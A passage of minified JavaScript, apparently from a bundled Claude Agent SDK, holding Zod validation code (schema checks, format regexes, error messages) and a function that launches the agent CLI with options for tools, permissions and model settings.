Object.entries(X).filter(([Q,J])=>{return Number.isNaN(Number.parseInt(Q,10))}).map((Q)=>Q[1])}class Pw{constructor(...X){}}function xd1(X,Q=(J)=>J.message){let J={},Y=[];for(let W of X.issues)if(W.path.length>0)J[W.path[0]]=J[W.path[0]]||[],J[W.path[0]].push(Q(W));else Y.push(Q(W));return{formErrors:Y,fieldErrors:J}}function fd1(X,Q){let J=Q||function(G){return G.message},Y={_errors:[]},W=(G)=>{for(let H of G.issues)if(H.code==="invalid_union"&&H.errors.length)H.errors.map(($)=>W({issues:$}));else if(H.code==="invalid_key")W({issues:H.issues});else if(H.code==="invalid_element")W({issues:H.issues});else if(H.path.length===0)Y._errors.push(J(H));else{let $=Y,z=0;while(z<H.path.length){let U=H.path[z];if(z!==H.path.length-1)$[U]=$[U]||{_errors:[]};else $[U]=$[U]||{_errors:[]},$[U]._errors.push(J(H));$=$[U],z++}}};return W(X),Y}function sd1(){return new RegExp(od1,"u")}function xw(X){return typeof X.precision==="number"?X.precision===-1?"(?:[01]\\d|2[0-3]):[0-5]\\d":X.precision===0?"(?:[01]\\d|2[0-3]):[0-5]\\d:[0-5]\\d":`(?:[01]\\d|2[0-3]):[0-5]\\d:[0-5]\\d\\.\\d{${X.precision}}`:"(?:[01]\\d|2[0-3]):[0-5]\\d(?::[0-5]\\d(?:\\.\\d+)?)?"}function Hi1(X){return new RegExp(`^${xw(X)}$`)}function $i1(X){let Q=xw({precision:X.precision}),J=["Z"];if(X.local)J.push("");if(X.offset)J.push("([+-]\\d{2}:\\d{2})");let Y=`${Q}(?:${J.join("|")})`;return new RegExp(`^${vw}T(?:${Y})$`)}class gw{constructor(X=[]){if(this.content=[],this.indent=0,this)this.args=X}indented(X){this.indent+=1,X(this),this.indent-=1}write(X){if(typeof X==="function"){X(this,{execution:"sync"}),X(this,{execution:"async"});return}let J=X.split(`
`).filter((G)=>G),Y=Math.min(...J.map((G)=>G.length-G.trimStart().length)),W=J.map((G)=>G.slice(Y)).map((G)=>" ".repeat(this.indent*2)+G);for(let G of W)this.content.push(G)}compile(){let X=Function,Q=this?.args,Y=[...(this?.content??[""]).map((W)=>`  ${W}`)];return new X(...Q,Y.join(`
`))}}function mw(X){if(X==="")return!0;if(X.length%4!==0)return!1;try{return atob(X),!0}catch{return!1}}function ni1(X){if(!bw.test(X))return!1;let Q=X.replace(/[-_]/g,(Y)=>Y==="-"?"+":"/"),J=Q.padEnd(Math.ceil(Q.length/4)*4,"=");return mw(J)}function si1(X,Q=null){try{let J=X.split(".");if(J.length!==3)return!1;let[Y]=J;if(!Y)return!1;let W=JSON.parse(atob(Y));if("typ"in W&&W?.typ!=="JWT")return!1;if(!W.alg)return!1;if(Q&&(!("alg"in W)||W.alg!==Q))return!1;return!0}catch{return!1}}function wN(X,Q,J){if(X.issues.length)Q.issues.push(...NX(J,X.issues));Q.value[J]=X.value}function GW(X,Q,J){if(X.issues.length)Q.issues.push(...NX(J,X.issues));Q.value[J]=X.value}function IN(X,Q,J,Y){if(X.issues.length)if(Y[J]===void 0)if(J in Y)Q.value[J]=void 0;else Q.value[J]=X.value;else Q.issues.push(...NX(J,X.issues));else if(X.value===void 0){if(J in Y)Q.value[J]=void 0}else Q.value[J]=X.value}function CN(X,Q,J,Y){for(let W of X)if(W.issues.length===0)return Q.value=W.value,Q;return Q.issues.push({code:"invalid_union",input:Q.value,inst:J,errors:X.map((W)=>W.issues.map((G)=>g8(G,Y,y8())))}),Q}function tU(X,Q){if(X===Q)return{valid:!0,data:X};if(X instanceof Date&&Q instanceof Date&&+X===+Q)return{valid:!0,data:X};if(fQ(X)&&fQ(Q)){let J=Object.keys(Q),Y=Object.keys(X).filter((G)=>J.indexOf(G)!==-1),W={...X,...Q};for(let G of Y){let H=tU(X[G],Q[G]);if(!H.valid)return{valid:!1,mergeErrorPath:[G,...H.mergeErrorPath]};W[G]=H.data}return{valid:!0,data:W}}if(Array.isArray(X)&&Array.isArray(Q)){if(X.length!==Q.length)return{valid:!1,mergeErrorPath:[]};let J=[];for(let Y=0;Y<X.length;Y++){let W=X[Y],G=Q[Y],H=tU(W,G);if(!H.valid)return{valid:!1,mergeErrorPath:[Y,...H.mergeErrorPath]};J.push(H.data)}return{valid:!0,data:J}}return{valid:!1,mergeErrorPath:[]}}function PN(X,Q,J){if(Q.issues.length)X.issues.push(...Q.issues);if(J.issues.length)X.issues.push(...J.issues);if(T5(X))return X;let Y=tU(Q.value,J.value);if(!Y.valid)throw Error(`Unmergable intersection. Error path: ${JSON.stringify(Y.mergeErrorPath)}`);return X.value=Y.data,X}function SN(X,Q){if(X.value===void 0)X.value=Q.defaultValue;return X}function EN(X,Q){if(!X.issues.length&&X.value===void 0)X.issues.push({code:"invalid_type",expected:"nonoptional",input:X.value,inst:Q});return X}function TN(X,Q,J){if(T5(X))return X;return Q.out._zod.run({value:X.value,issues:X.issues},J)}function _N(X){return X.value=Object.freeze(X.value),X}function kN(X,Q,J,Y){if(!X){let W={code:"custom",input:J,inst:Y,path:[...Y._zod.def.path??[]],continue:!Y._zod.def.abort};if(Y._zod.def.params)W.params=Y._zod.def.params;Q.issues.push(Cw(W))}}function Nr1(){return{localeError:Dr1()}}class lw{constructor(){this._map=new WeakMap,this._idmap=new Map}add(X,...Q){let J=Q[0];if(this._map.set(X,J),J&&typeof J==="object"&&"id"in J){if(this._idmap.has(J.id))throw Error(`ID ${J.id} already exists in the registry`);this._idmap.set(J.id,X)}return this}remove(X){return this._map.delete(X),this}get(X){let Q=X._zod.parent;if(Q){let J={...this.get(Q)??{}};return delete J.id,{...J,...this._map.get(X)}}return this._map.get(X)}has(X){return this._map.has(X)}}function wr1(){return new lw}function Ir1(X,Q){return new X({type:"string",...t1(Q)})}function Cr1(X,Q){return new X({type:"string",format:"email",check:"string_format",abort:!1,...t1(Q)})}function bN(X,Q){return new X({type:"string",format:"guid",check:"string_format",abort:!1,...t1(Q)})}function Pr1(X,Q){return new X({type:"string",format:"uuid",check:"string_format",abort:!1,...t1(Q)})}function Sr1(X,Q){return new X({type:"string",format:"uuid",check:"string_format",abort:!1,version:"v4",...t1(Q)})}function Er1(X,Q){return new X({type:"string",format:"uuid",check:"string_format",abort:!1,version:"v6",...t1(Q)})}function Tr1(X,Q){return new X({type:"string",format:"uuid",check:"string_format",abort:!1,version:"v7",...t1(Q)})}function _r1(X,Q){return new X({type:"string",format:"url",check:"string_format",abort:!1,...t1(Q)})}function kr1(X,Q){return new X({type:"string",format:"emoji",check:"string_format",abort:!1,...t1(Q)})}function br1(X,Q){return new X({type:"string",format:"nanoid",check:"string_format",abort:!1,...t1(Q)})}function vr1(X,Q){return new X({type:"string",format:"cuid",check:"string_format",abort:!1,...t1(Q)})}function xr1(X,Q){return new X({type:"string",format:"cuid2",check:"string_format",abort:!1,...t1(Q)})}function fr1(X,Q){return new X({type:"string",format:"ulid",check:"string_format",abort:!1,...t1(Q)})}function hr1(X,Q){return new X({type:"string",format:"xid",check:"string_format",abort:!1,...t1(Q)})}function yr1(X,Q){return new X({type:"string",format:"ksuid",check:"string_format",abort:!1,...t1(Q)})}function gr1(X,Q){return new X({type:"string",format:"ipv4",check:"string_format",abort:!1,...t1(Q)})}function mr1(X,Q){return new X({type:"string",format:"ipv6",check:"string_format",abort:!1,...t1(Q)})}function ur1(X,Q){return new X({type:"string",format:"cidrv4",check:"string_format",abort:!1,...t1(Q)})}function cr1(X,Q){return new X({type:"string",format:"cidrv6",check:"string_format",abort:!1,...t1(Q)})}function lr1(X,Q){return new X({type:"string",format:"base64",check:"string_format",abort:!1,...t1(Q)})}function pr1(X,Q){return new X({type:"string",format:"base64url",check:"string_format",abort:!1,...t1(Q)})}function dr1(X,Q){return new X({type:"string",format:"e164",check:"string_format",abort:!1,...t1(Q)})}function ir1(X,Q){return new X({type:"string",format:"jwt",check:"string_format",abort:!1,...t1(Q)})}function rr1(X,Q){return new X({type:"string",format:"datetime",check:"string_format",offset:!1,local:!1,precision:null,...t1(Q)})}function nr1(X,Q){return new X({type:"string",format:"date",check:"string_format",...t1(Q)})}function ar1(X,Q){return new X({type:"string",format:"time",check:"string_format",precision:null,...t1(Q)})}function or1(X,Q){return new X({type:"string",format:"duration",check:"string_format",...t1(Q)})}function sr1(X,Q){return new X({type:"number",checks:[],...t1(Q)})}function tr1(X,Q){return new X({type:"number",check:"number_format",abort:!1,format:"safeint",...t1(Q)})}function er1(X,Q){return new X({type:"boolean",...t1(Q)})}function Xn1(X,Q){return new X({type:"null",...t1(Q)})}function Qn1(X){return new X({type:"unknown"})}function Jn1(X,Q){return new X({type:"never",...t1(Q)})}function vN(X,Q){return new hw({check:"less_than",...t1(Q),value:X,inclusive:!1})}function lU(X,Q){return new hw({check:"less_than",...t1(Q),value:X,inclusive:!0})}function xN(X,Q){return new yw({check:"greater_than",...t1(Q),value:X,inclusive:!1})}function pU(X,Q){return new yw({check:"greater_than",...t1(Q),value:X,inclusive:!0})}function fN(X,Q){return new Mi1({check:"multiple_of",...t1(Q),value:X})}function pw(X,Q){return new Fi1({check:"max_length",...t1(Q),maximum:X})}function AW(X,Q){return new Oi1({check:"min_length",...t1(Q),minimum:X})}function dw(X,Q){return new Ai1({check:"length_equals",...t1(Q),length:X})}function Yn1(X,Q){return new Ri1({check:"string_format",format:"regex",...t1(Q),pattern:X})}function Wn1(X){return new Li1({check:"string_format",format:"lowercase",...t1(X)})}function Gn1(X){return new Di1({check:"string_format",format:"uppercase",...t1(X)})}function Hn1(X,Q){return new Ni1({check:"string_format",format:"includes",...t1(Q),includes:X})}function $n1(X,Q){return new wi1({check:"string_format",format:"starts_with",...t1(Q),prefix:X})}function zn1(X,Q){return new Ii1({check:"string_format",format:"ends_with",...t1(Q),suffix:X})}function yQ(X){return new Ci1({check:"overwrite",tx:X})}function Un1(X){return yQ((Q)=>Q.normalize(X))}function Kn1(){return yQ((X)=>X.trim())}function Vn1(){return yQ((X)=>X.toLowerCase())}function Bn1(){return yQ((X)=>X.toUpperCase())}function qn1(X,Q,J){return new X({type:"array",element:Q,...t1(J)})}function Zn1(X,Q,J){let Y=t1(J);return Y.abort??(Y.abort=!0),new X({type:"custom",check:"custom",fn:Q,...Y})}function Mn1(X,Q,J){return new X({type:"custom",check:"custom",fn:Q,...t1(J)})}function nw(X){return rr1(rw,X)}function ow(X){return nr1(aw,X)}function tw(X){return ar1(sw,X)}function XI(X){return or1(ew,X)}function J1(X){return Ir1(Rn1,X)}function _0(X){return sr1(YI,X)}function yN(X){return tr1(yn1,X)}function L9(X){return er1(gn1,X)}function WI(X){return Xn1(mn1,X)}function G9(){return Qn1(un1)}function ln1(X){return Jn1(cn1,X)}function A0(X,Q){return qn1(pn1,X,Q)}function A1(X,Q){let J={type:"object",get shape(){return x0.assignProp(this,"shape",{...X}),this.shape},...x0.normalizeParams(Q)};return new GI(J)}function v6(X,Q){return new GI({type:"object",get shape(){return x0.assignProp(this,"shape",{...X}),this.shape},catchall:G9(),...x0.normalizeParams(Q)})}function u0(X,Q){return new HI({type:"union",options:X,...x0.normalizeParams(Q)})}function $I(X,Q,J){return new dn1({type:"union",options:Q,discriminator:X,...x0.normalizeParams(J)})}function BK(X,Q){return new in1({type:"intersection",left:X,right:Q})}function H9(X,Q,J){return new rn1({type:"record",keyType:X,valueType:Q,...x0.normalizeParams(J)})}function D9(X,Q){let J=Array.isArray(X)?Object.fromEntries(X.map((Y)=>[Y,Y])):X;return new eU({type:"enum",entries:J,...x0.normalizeParams(Q)})}function m1(X,Q){return new nn1({type:"literal",values:Array.isArray(X)?X:[X],...x0.normalizeParams(Q)})}function zI(X){return new an1({type:"transform",transform:X})}function g1(X){return new UI({type:"optional",innerType:X})}function gN(X){return new on1({type:"nullable",innerType:X})}function tn1(X,Q){return new sn1({type:"default",innerType:X,get defaultValue(){return typeof Q==="function"?Q():Q}})}function Xa1(X,Q){return new en1({type:"prefault",innerType:X,get defaultValue(){return typeof Q==="function"?Q():Q}})}function Qa1(X,Q){return new KI({type:"nonoptional",innerType:X,...x0.normalizeParams(Q)})}function Ya1(X,Q){return new Ja1({type:"catch",innerType:X,catchValue:typeof Q==="function"?Q:()=>Q})}function XK(X,Q){return new Wa1({type:"pipe",in:X,out:Q})}function Ha1(X){return new Ga1({type:"readonly",innerType:X})}function $a1(X,Q){let J=new p9({check:"custom",...x0.normalizeParams(Q)});return J._zod.check=X,J}function za1(X,Q){return Zn1(VI,X??(()=>!0),Q)}function Ua1(X,Q={}){return Mn1(VI,X,Q)}function Ka1(X,Q){let J=$a1((Y)=>{return Y.addIssue=(W)=>{if(typeof W==="string")Y.issues.push(x0.issue(W,Y.value,J._zod.def));else{let G=W;if(G.fatal)G.continue=!1;G.code??(G.code="custom"),G.input??(G.input=Y.value),G.inst??(G.inst=J),G.continue??(G.continue=!J._zod.def.abort),Y.issues.push(x0.issue(G))}},X(Y.value,Y)},Q);return J}function BI(X,Q){return XK(zI(X),Q)}function j7({prompt:X,options:Q}){let{systemPrompt:J,settingSources:Y,sandbox:W,...G}=Q??{},H,$;if(J===void 0)H="";else if(typeof J==="string")H=J;else if(J.type==="preset")$=J.append;let z=G.pathToClaudeCodeExecutable;if(!z){let N1=Rc1(import.meta.url),r=UN(N1,"..");z=UN(r,"cli.js")}process.env.CLAUDE_AGENT_SDK_VERSION="0.1.77";let{abortController:U=sN(),additionalDirectories:K=[],agents:B,allowedTools:q=[],betas:Z,canUseTool:M,continue:L,cwd:R,disallowedTools:j=[],tools:F,env:A,executable:O=Vw()?"bun":"node",executableArgs:w=[],extraArgs:N={},fallbackModel:C,enableFileCheckpointing:_,forkSession:h,hooks:o,includePartialMessages:p,persistSession:e,maxThinkingTokens:d,maxTurns:Q1,maxBudgetUsd:V1,mcpServers:D1,model:n,outputFormat:t,permissionMode:u="default",allowDangerouslySkipPermissions:E=!1,permissionPromptToolName:y,plugins:a,resume:I,resumeSessionAt:v,stderr:g,strictMcpConfig:H1}=G,z1=t?.type==="json_schema"?t.schema:void 0,P1=A;if(!P1)P1={...process.env};if(!P1.CLAUDE_CODE_ENTRYPOINT)P1.CLAUDE_CODE_ENTRYPOINT="sdk-ts";if(_)P1.CLAUDE_CODE_ENABLE_SDK_FILE_CHECKPOINTING="true";if(!z)throw Error("pathToClaudeCodeExecutable is required");let j1={},k1=new Map;if(D1)for(let[N1,r]of Object.entries(D1))if(r.type==="sdk"&&"instance"in r)k1.set(N1,r.instance),j1[N1]={type:"sdk",name:N1};else j1[N1]=r;let Y1=typeof X==="string",k=new Bw({abortController:U,additionalDirectories:K,betas:Z,cwd:R,executable:O,executableArgs:w,extraArgs:N,pathToClaudeCodeExecutable:z,env:P1,forkSession:h,stderr:g,maxThinkingTokens:d,maxTurns:Q1,maxBudgetUsd:V1,model:n,fallbackModel:C,jsonSchema:z1,permissionMode:u,allowDangerouslySkipPermissions:E,permissionPromptToolName:y,continueConversation:L,resume:I,resumeSessionAt:v,settingSources:Y??[],allowedTools:q,disallowedTools:j,tools:F,mcpServers:j1,strictMcpConfig:H1,canUseTool:!!M,hooks:!!o,includePartialMessages:p,persistSession:e,plugins:a,sandbox:W,spawnClaudeCodeProcess:G.spawnClaudeCodeProcess}),X1=new Mw(k,Y1,M,o,U,k1,z1,{systemPrompt:H,appendSystemPrompt:$,agents:B});if(typeof X==="string")k.write(J8({type:"user",session_id:"",message:{role:"user",content:[{type:"text",text:X}]},parent_tool_use_id:null})+`
`);else X1.streamInput(X);return X1}var Au1,Ru1,dU,Lu1,Du1,cN=(X,Q,J)=>{J=X!=null?Au1(Ru1(X)):{};let Y=Q||!X||!X.__esModule?dU(J,"default",{value:X,enumerable:!0}):J;for(let W of Lu1(X))if(!Du1.call(Y,W))dU(Y,W,{get:()=>X[W],enumerable:!0});return Y},S1=(X,Q)=>()=>(Q||X((Q={exports:{}}).exports,Q),Q.exports),lN=(X,Q)=>{for(var J in Q)dU(X,J,{get:Q[J],enumerable:!0,configurable:!0,set:(Y)=>Q[J]=()=>Y})},zW,zN,V0,D0,IX,LW,Nu1,pN,dN,UW,wu1,x6,Iu1,Cu1,iN,Pu1,DW,NW,QK,wW,JK,Su1,Eu1,Tu1,_u1,ku1,bu1,vu1,xu1,fu1,hu1,yu1,gu1,mu1,uu1,cu1,lu1,pu1,du1,YK,iu1,ru1,nu1,au1,rN,nN,ou1,su1,tu1,eu1,Xc1,aN,Qc1,Jc1,Yc1,Wc1,Gc1,Hc1,$c1,zc1,Uc1,Kc1,Vc1,Bc1,qc1,Zc1,Mc1,jc1,oN,Fc1,Oc1,Ac1,Dc1=50,Cc1,Pc1,Sc1,Ec1,WK,Tc1,KW,tN,_c1,kc1,OQ,vc1,xc1,fc1,yc1,gc1="[object Null]",mc1="[object Undefined]",KN,cc1,eN,pc1="[object AsyncFunction]",dc1="[object Function]",ic1="[object GeneratorFunction]",rc1="[object Proxy]",ac1,oc1,mU,VN,tc1,ec1,Xl1,Jl1,Yl1,Wl1,Gl1,Hl1,$l1,zl1,Ul1,Vl1,ql1,Xw,Ml1,DQ,Fl1,Al1,Rl1="__lodash_hash_undefined__",Ll1,Dl1,wl1,Il1,Cl1,Sl1,El1="__lodash_hash_undefined__",_l1,BN,bl1,xl1,IW,hl1,yl1,ml1,cl1,pl1,il1,rl1,nl1,al1,sl1,el1,CW,Jp1,Wp1,Hp1,zp1,Qw,Up1="Expected a function",hQ,qN=2000,Vp1,uU=150000,JW=30000,Rp1,pz0,Lp1,B7,MN=10,wp1=1e4,jN,Hw=1/0,zw=(X,Q)=>{let J=typeof X==="string"?X.length:0;return $w(`JSON.parse(${J} chars)`,()=>JSON.parse(X,Q))},Sp1,Ep1,Uw,_p1=!1,YW=null,bp1,vp1,xp1,E5,WW=null,ON=!1,qw,Mw,R0,AN,T1,DX=(X)=>{switch(typeof X){case"undefined":return T1.undefined;case"string":return T1.string;case"number":return Number.isNaN(X)?T1.nan:T1.number;case"boolean":return T1.boolean;case"function":return T1.function;case"bigint":return T1.bigint;case"symbol":return T1.symbol;case"object":if(Array.isArray(X))return T1.array;if(X===null)return T1.null;if(X.then&&typeof X.then==="function"&&X.catch&&typeof X.catch==="function")return T1.promise;if(typeof Map<"u"&&X instanceof Map)return T1.map;if(typeof Set<"u"&&X instanceof Set)return T1.set;if(typeof Date<"u"&&X instanceof Date)return T1.date;return T1.object;default:return T1.unknown}},q1,K6,pp1=(X,Q)=>{let J;switch(X.code){case q1.invalid_type:if(X.received===T1.undefined)J="Required";else J=`Expected ${X.expected}, received ${X.received}`;break;case q1.invalid_literal:J=`Invalid literal value, expected ${JSON.stringify(X.expected,R0.jsonStringifyReplacer)}`;break;case q1.unrecognized_keys:J=`Unrecognized key(s) in object: ${R0.joinValues(X.keys,", ")}`;break;case q1.invalid_union:J="Invalid input";break;case q1.invalid_union_discriminator:J=`Invalid discriminator value. Expected ${R0.joinValues(X.options)}`;break;case q1.invalid_enum_value:J=`Invalid enum value. Expected ${R0.joinValues(X.options)}, received '${X.received}'`;break;case q1.invalid_arguments:J="Invalid function arguments";break;case q1.invalid_return_type:J="Invalid function return type";break;case q1.invalid_date:J="Invalid date";break;case q1.invalid_string:if(typeof X.validation==="object")if("includes"in X.validation){if(J=`Invalid input: must include "${X.validation.includes}"`,typeof X.validation.position==="number")J=`${J} at one or more positions greater than or equal to ${X.validation.position}`}else if("startsWith"in X.validation)J=`Invalid input: must start with "${X.validation.startsWith}"`;else if("endsWith"in X.validation)J=`Invalid input: must end with "${X.validation.endsWith}"`;else R0.assertNever(X.validation);else if(X.validation!=="regex")J=`Invalid ${X.validation}`;else J="Invalid";break;case q1.too_small:if(X.type==="array")J=`Array must contain ${X.exact?"exactly":X.inclusive?"at least":"more than"} ${X.minimum} element(s)`;else if(X.type==="string")J=`String must contain ${X.exact?"exactly":X.inclusive?"at least":"over"} ${X.minimum} character(s)`;else if(X.type==="number")J=`Number must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${X.minimum}`;else if(X.type==="bigint")J=`Number must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${X.minimum}`;else if(X.type==="date")J=`Date must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${new Date(Number(X.minimum))}`;else J="Invalid input";break;case q1.too_big:if(X.type==="array")J=`Array must contain ${X.exact?"exactly":X.inclusive?"at most":"less than"} ${X.maximum} element(s)`;else if(X.type==="string")J=`String must contain ${X.exact?"exactly":X.inclusive?"at most":"under"} ${X.maximum} character(s)`;else if(X.type==="number")J=`Number must be ${X.exact?"exactly":X.inclusive?"less than or equal to":"less than"} ${X.maximum}`;else if(X.type==="bigint")J=`BigInt must be ${X.exact?"exactly":X.inclusive?"less than or equal to":"less than"} ${X.maximum}`;else if(X.type==="date")J=`Date must be ${X.exact?"exactly":X.inclusive?"smaller than or equal to":"smaller than"} ${new Date(Number(X.maximum))}`;else J="Invalid input";break;case q1.custom:J="Invalid input";break;case q1.invalid_intersection_types:J="Intersection results could not be merged";break;case q1.not_multiple_of:J=`Number must be a multiple of ${X.multipleOf}`;break;case q1.not_finite:J="Number must be finite";break;default:J=Q.defaultError,R0.assertNever(X)}return{message:J}},NQ,dp1,nU=(X)=>{let{data:Q,path:J,errorMaps:Y,issueData:W}=X,G=[...J,...W.path||[]],H={...W,path:G};if(W.message!==void 0)return{...W,path:G,message:W.message};let $="",z=Y.filter((U)=>!!U).slice().reverse();for(let U of z)$=U(H,{data:Q,defaultError:$}).message;return{...W,path:G,message:$}},X0,AQ=(X)=>({status:"dirty",value:X}),l9=(X)=>({status:"valid",value:X}),RN=(X)=>X.status==="aborted",LN=(X)=>X.status==="dirty",_5=(X)=>X.status==="valid",VW=(X)=>typeof Promise<"u"&&X instanceof Promise,f1,DN=(X,Q)=>{if(_5(Q))return{success:!0,data:Q.value};else{if(!X.common.issues.length)throw Error("Validation failed but no issues detected.");return{success:!1,get error(){if(this._error)return this._error;let J=new K6(X.common.issues);return this._error=J,this._error}}}},ip1,rp1,np1,ap1,op1,sp1,tp1,ep1,Xd1="^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$",cU,Qd1,Jd1,Yd1,Wd1,Gd1,Hd1,jw="((\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-((0[13578]|1[02])-(0[1-9]|[12]\\d|3[01])|(0[469]|11)-(0[1-9]|[12]\\d|30)|(02)-(0[1-9]|1\\d|2[0-8])))",$d1,x8,k5,b5,BW,wQ,qW,IQ,CQ,ZW,q7,f8,MW,Y8,r0,PQ,k8=(X)=>{if(X instanceof EQ)return k8(X.schema);else if(X instanceof H8)return k8(X.innerType());else if(X instanceof TQ)return[X.value];else if(X instanceof Z7)return X.options;else if(X instanceof _Q)return R0.objectValues(X.enum);else if(X instanceof kQ)return k8(X._def.innerType);else if(X instanceof IQ)return[void 0];else if(X instanceof CQ)return[null];else if(X instanceof W8)return[void 0,...k8(X.unwrap())];else if(X instanceof wX)return[null,...k8(X.unwrap())];else if(X instanceof $K)return k8(X.unwrap());else if(X instanceof vQ)return k8(X.unwrap());else if(X instanceof bQ)return k8(X._def.innerType);else return[]},HK,SQ,h8,jW,FW,v5,LQ,EQ,TQ,Z7,_Q,x5,H8,W8,wX,kQ,bQ,OW,az0,$K,PW,vQ,oz0,Q0,sz0,tz0,ez0,XU0,QU0,JU0,YU0,WU0,GU0,HU0,$U0,zU0,UU0,KU0,VU0,BU0,qU0,ZU0,MU0,jU0,FU0,OU0,AU0,RU0,LU0,DU0,NU0,wU0,IU0,CU0,PU0,SU0,EU0,TU0,_U0,kU0,f5,oU,x0,UK,Dw,Nd1=(X)=>{let Q=typeof X;switch(Q){case"undefined":return"undefined";case"string":return"string";case"number":return Number.isNaN(X)?"nan":"number";case"boolean":return"boolean";case"function":return"function";case"bigint":return"bigint";case"symbol":return"symbol";case"object":if(Array.isArray(X))return"array";if(X===null)return"null";if(X.then&&typeof X.then==="function"&&X.catch&&typeof X.catch==="function")return"promise";if(typeof Map<"u"&&X instanceof Map)return"map";if(typeof Set<"u"&&X instanceof Set)return"set";if(typeof Date<"u"&&X instanceof Date)return"date";if(typeof File<"u"&&X instanceof File)return"file";return"object";default:throw Error(`Unknown data type: ${Q}`)}},Nw,wd1,Iw,Cd1,Sw=(X,Q)=>{X.name="$ZodError",Object.defineProperty(X,"_zod",{value:X._zod,enumerable:!1}),Object.defineProperty(X,"issues",{value:Q,enumerable:!1}),Object.defineProperty(X,"message",{get(){return JSON.stringify(Q,Rw,2)},enumerable:!0})},Ew,Tw,hd1=(X)=>(Q,J,Y,W)=>{let G=Y?Object.assign(Y,{async:!1}):{async:!1},H=Q._zod.run({value:J,issues:[]},G);if(H instanceof Promise)throw new f5;if(H.issues.length){let $=new(W?.Err??X)(H.issues.map((z)=>g8(z,G,y8())));throw UK($,W?.callee),$}return H.value},yd1=(X)=>async(Q,J,Y,W)=>{let G=Y?Object.assign(Y,{async:!0}):{async:!0},H=Q._zod.run({value:J,issues:[]},G);if(H instanceof Promise)H=await H;if(H.issues.length){let $=new(W?.Err??X)(H.issues.map((z)=>g8(z,G,y8())));throw UK($,W?.callee),$}return H.value},_w=(X)=>(Q,J,Y)=>{let W=Y?{...Y,async:!1}:{async:!1},G=Q._zod.run({value:J,issues:[]},W);if(G instanceof Promise)throw new f5;return G.issues.length?{success:!1,error:new(X??Ew)(G.issues.map((H)=>g8(H,W,y8())))}:{success:!0,data:G.value}},gd1,kw=(X)=>async(Q,J,Y)=>{let W=Y?Object.assign(Y,{async:!0}):{async:!0},G=Q._zod.run({value:J,issues:[]},W);if(G instanceof Promise)G=await G;return G.issues.length?{success:!1,error:new X(G.issues.map((H)=>g8(H,W,y8())))}:{success:!0,data:G.value}},md1,ud1,cd1,ld1,pd1,dd1,id1,rd1,nd1,NN=(X)=>{if(!X)return/^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-8][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}|00000000-0000-0000-0000-000000000000)$/;return new RegExp(`^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-${X}[0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12})$`)},ad1,od1="^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$",td1,ed1,Xi1,Qi1,Ji1,bw,Yi1,Wi1,vw="(?:(?:\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-(?:(?:0[13578]|1[02])-(?:0[1-9]|[12]\\d|3[01])|(?:0[469]|11)-(?:0[1-9]|[12]\\d|30)|(?:02)-(?:0[1-9]|1\\d|2[0-8])))",Gi1,zi1=(X)=>{let Q=X?`[\\s\\S]{${X?.minimum??0},${X?.maximum??""}}`:"[\\s\\S]*";return new RegExp(`^${Q}$`)},Ui1,Ki1,Vi1,Bi1,qi1,Zi1,p9,fw,hw,yw,Mi1,ji1,Fi1,Oi1,Ai1,kW,Ri1,Li1,Di1,Ni1,wi1,Ii1,Ci1,Pi1,h0,VK,m0,Si1,Ei1,Ti1,_i1,ki1,bi1,vi1,xi1,fi1,hi1,yi1,gi1,mi1,ui1,ci1,li1,pi1,di1,ii1,ri1,ai1,oi1,ti1,uw,ei1,Xr1,Qr1,Jr1,Yr1,Wr1,Gr1,cw,Hr1,$r1,zr1,Ur1,Kr1,Vr1,Br1,qr1,Zr1,Mr1,jr1,Fr1,Or1,Ar1,Rr1,Lr1=(X)=>{let Q=typeof X;switch(Q){case"number":return Number.isNaN(X)?"NaN":"number";case"object":{if(Array.isArray(X))return"array";if(X===null)return"null";if(Object.getPrototypeOf(X)!==Object.prototype&&X.constructor)return X.constructor.name}}return Q},Dr1=()=>{let X={string:{unit:"characters",verb:"to have"},file:{unit:"bytes",verb:"to have"},array:{unit:"items",verb:"to have"},set:{unit:"items",verb:"to have"}};function Q(Y){return X[Y]??null}let J={regex:"input",email:"email address",url:"URL",emoji:"emoji",uuid:"UUID",uuidv4:"UUIDv4",uuidv6:"UUIDv6",nanoid:"nanoid",guid:"GUID",cuid:"cuid",cuid2:"cuid2",ulid:"ULID",xid:"XID",ksuid:"KSUID",datetime:"ISO datetime",date:"ISO date",time:"ISO time",duration:"ISO duration",ipv4:"IPv4 address",ipv6:"IPv6 address",cidrv4:"IPv4 range",cidrv6:"IPv6 range",base64:"base64-encoded string",base64url:"base64url-encoded string",json_string:"JSON string",e164:"E.164 number",jwt:"JWT",template_literal:"input"};return(Y)=>{switch(Y.code){case"invalid_type":return`Invalid input: expected ${Y.expected}, received ${Lr1(Y.input)}`;case"invalid_value":if(Y.values.length===1)return`Invalid input: expected ${KK(Y.values[0])}`;return`Invalid option: expected one of ${sU(Y.values,"|")}`;case"too_big":{let W=Y.inclusive?"<=":"<",G=Q(Y.origin);if(G)return`Too big: expected ${Y.origin??"value"} to have ${W}${Y.maximum.toString()} ${G.unit??"elements"}`;return`Too big: expected ${Y.origin??"value"} to be ${W}${Y.maximum.toString()}`}case"too_small":{let W=Y.inclusive?">=":">",G=Q(Y.origin);if(G)return`Too small: expected ${Y.origin} to have ${W}${Y.minimum.toString()} ${G.unit}`;return`Too small: expected ${Y.origin} to be ${W}${Y.minimum.toString()}`}case"invalid_format":{let W=Y;if(W.format==="starts_with")return`Invalid string: must start with "${W.prefix}"`;if(W.format==="ends_with")return`Invalid string: must end with "${W.suffix}"`;if(W.format==="includes")return`Invalid string: must include "${W.includes}"`;if(W.format==="regex")return`Invalid string: must match pattern ${W.pattern}`;return`Invalid ${J[W.format]??Y.format}`}case"not_multiple_of":return`Invalid number: must be a multiple of 